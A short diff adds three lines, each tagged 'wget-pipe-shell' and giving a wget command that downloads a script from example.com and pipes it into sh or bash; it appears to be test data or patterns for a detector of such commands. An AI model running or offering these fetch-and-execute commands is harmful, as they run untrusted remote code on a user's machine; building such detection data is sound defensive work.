@@ -1,0 +1,3 @@
+wget-pipe-shell	wget -O- https://example.com/x.sh | sh
+wget-pipe-shell	wget -qO- https://example.com/x.sh | bash
+wget-pipe-shell	wget -qO - https://example.com/x.sh | sh
